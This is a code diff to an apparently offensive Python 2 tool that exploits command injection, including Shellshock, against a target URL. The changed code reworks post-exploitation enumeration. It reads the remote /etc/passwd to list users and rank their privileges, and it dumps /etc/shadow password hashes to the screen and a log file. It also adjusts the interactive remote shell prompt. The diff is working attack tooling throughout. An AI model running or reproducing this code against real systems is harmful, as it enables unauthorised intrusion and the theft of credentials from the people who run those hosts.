@@ -158,89 +158,116 @@ def enumeration(url, cve, check_header, filename):
   if menu.options.users:
     cmd = settings.SYS_USERS             
     sys_users = cmd_exec(url, cmd, cve, check_header, filename)
-    if sys_users :
-      sys_users = "".join(str(p) for p in sys_users)
+    sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+    sys.stdout.flush()
+    if sys_users[0] :
+      sys_users = "".join(str(p) for p in sys_users).strip()
       if len(sys_users.split(" ")) <= 1 :
         sys_users = sys_users.split("\n")
       else:
         sys_users = sys_users.split(" ")
-      sys_users_list = []
-      for user in range(0, len(sys_users), 3):
-         sys_users_list.append(sys_users[user : user + 3])
-      if len(sys_users_list) != 0 :
-        sys.stdout.write("(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+      # Check for appropriate '/etc/passwd' format.
+      if len(sys_users) % 3 != 0 :
+        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+        sys.stdout.flush()
+        print "\n" + Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
+        sys_users = " ".join(str(p) for p in sys_users).strip()
+        print sys_users
+        output_file = open(filename, "a")
+        output_file.write("      " + sys_users)
+        output_file.close()
+      else:  
+        sys_users_list = []
+        for user in range(0, len(sys_users), 3):
+           sys_users_list.append(sys_users[user : user + 3])
+        if len(sys_users_list) != 0 :
+          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
+          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
+          sys.stdout.flush()
+          # Add infos to logs file.   
+          output_file = open(filename, "a")
+          output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n")
+          output_file.close()
+          count = 0
+          for user in range(0, len(sys_users_list)):
+            sys_users = sys_users_list[user]
+            sys_users = ":".join(str(p) for p in sys_users)
+            if menu.options.verbose:
+              print ""
+            count = count + 1
+            fields = sys_users.split(":")
+            fields1 = "".join(str(p) for p in fields)
+            # System users privileges enumeration
+            try:
+              if not fields[2].startswith("/"):
+                raise ValueError()
+              if menu.options.privileges:
+                if int(fields[1]) == 0:
+                  is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
+                  is_privilleged_nh = " is root user "
+                elif int(fields[1]) > 0 and int(fields[1]) < 99 :
+                  is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
+                  is_privilleged_nh = " is system user "
+                elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
+                  if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
+                    is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
+                    is_privilleged_nh = " is anonymous user "
+                  elif int(fields[1]) == 60002:
+                    is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
+                    is_privilleged_nh = " is non-trusted user "   
+                  else:
+                    is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
+                    is_privilleged_nh = " is regular user "
+                else :
+                  is_privilleged = ""
+                  is_privilleged_nh = ""
+              else :
+                is_privilleged = ""
+                is_privilleged_nh = ""
+              print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
+              # Add infos to logs file.   
+              output_file = open(filename, "a")
+              output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privilleged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+              output_file.close()
+            except ValueError:
+              if count == 1 :
+                print Fore.YELLOW + "(^) Warning: It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
+              sys_users = " ".join(str(p) for p in sys_users.split(":"))
+              print sys_users
+              output_file = open(filename, "a")
+              output_file.write("      " + sys_users)
+              output_file.close()
+    else:
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      sys.stdout.flush()
+      print "\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   
+
+    settings.ENUMERATION_DONE = True
+
+  #-------------------------------------
+  # System password enumeration
+  #-------------------------------------
+  if menu.options.passwords:
+    cmd = settings.SYS_PASSES            
+    sys_passes = cmd_exec(url, cmd, cve, check_header, filename)
+    if sys_passes :
+      sys_passes = "".join(str(p) for p in sys_passes)
+      sys_passes = sys_passes.replace(" ", "\n")
+      sys_passes = sys_passes.split( )
+      if len(sys_passes) != 0 :
+        sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
         sys.stdout.flush()
         sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
+        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write("    (!) Identified " + str(len(sys_users_list)) + " entries in '" + settings.PASSWD_FILE + "'.\n")
+        output_file.write("\n    (!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" )
         output_file.close()
         count = 0
-        for user in range(0, len(sys_users_list)):
-          sys_users = sys_users_list[user]
-          sys_users = ":".join(str(p) for p in sys_users)
-          if menu.options.verbose:
-            print ""
+        for line in sys_passes:
           count = count + 1
-          fields = sys_users.split(":")
-          # System users privileges enumeration
-          if menu.options.privileges:
-            if int(fields[1]) == 0:
-              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
-              is_privilleged_nh = " is root user "
-            elif int(fields[1]) > 0 and int(fields[1]) < 99 :
-              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
-              is_privilleged_nh = " is system user "
-            elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
-              if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
-                is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
-                is_privilleged_nh = " is anonymous user "
-              elif int(fields[1]) == 60002:
-                is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
-                is_privilleged_nh = " is non-trusted user "   
-              else:
-                is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
-                is_privilleged_nh = " is regular user "
-            else :
-              is_privilleged = ""
-              is_privilleged_nh = ""
-          else :
-            is_privilleged = ""
-            is_privilleged_nh = ""
-          print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
-          # Add infos to logs file.   
-          output_file = open(filename, "a")
-          output_file.write("      ("+str(count)+") '" + fields[0]+ "'" + is_privilleged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
-          output_file.close()
-      else:
-        print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
-    settings.ENUMERATION_DONE = True
-
-    #-------------------------------------
-    # System password enumeration
-    #-------------------------------------
-    if menu.options.passwords:
-      cmd = settings.SYS_PASSES            
-      sys_passes = cmd_exec(url, cmd, cve, check_header, filename)
-      if sys_passes :
-        sys_passes = "".join(str(p) for p in sys_passes)
-        sys_passes = sys_passes.replace(" ", "\n")
-        sys_passes = sys_passes.split( )
-        if len(sys_passes) != 0 :
-          sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
-          sys.stdout.flush()
-          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
-          sys.stdout.flush()
-          # Add infos to logs file.   
-          output_file = open(filename, "a")
-          output_file.write("    (!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" )
-          output_file.close()
-          count = 0
-          for line in sys_passes:
-            count = count + 1
+          try:
             fields = line.split(":")
             if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
               print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
@@ -248,9 +275,17 @@ def enumeration(url, cve, check_header, filename):
               output_file = open(filename, "a")
               output_file.write("      ("+str(count)+") " + fields[0] + " : " + fields[1])
               output_file.close()
-        else:
-          print Fore.YELLOW + "(^) Warning: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
-      settings.ENUMERATION_DONE = True  
+          # Check for appropriate (/etc/shadow) format
+          except IndexError:
+            if count == 1 :
+              sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
+            print fields[0]
+            output_file = open(filename, "a")
+            output_file.write("      " + fields[0])
+            output_file.close()
+      else:
+        print Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL
+    settings.ENUMERATION_DONE = True  
 
   if settings.ENUMERATION_DONE == True:
     print ""
@@ -501,6 +536,7 @@ def shellshock_handler(url, http_request_method, filename):
                 while True:
                   try:
                     cmd = raw_input("Shell > ")
+                    cmd = checks.escaped_cmd(cmd)
                     if cmd.lower() in settings.SHELL_OPTIONS:
                       if cmd.lower() == "?":
                         menu.shell_options()
@@ -508,7 +544,7 @@ def shellshock_handler(url, http_request_method, filename):
                         sys.exit(0)
                       elif cmd.lower() == "back":
                         go_back = True
-                        if checks.check_next_attack_vector(technique, go_back) == True:
+                        if checks.next_attack_vector(technique, go_back) == True:
                           break
                         else:
                           if no_result == True:
@@ -530,7 +566,7 @@ def shellshock_handler(url, http_request_method, filename):
                     sys.exit(0)
 
               elif gotshell in settings.CHOISE_NO:
-                if checks.check_next_attack_vector(technique, go_back) == True:
+                if checks.next_attack_vector(technique, go_back) == True:
                   break
                 else:
                   if no_result == True:
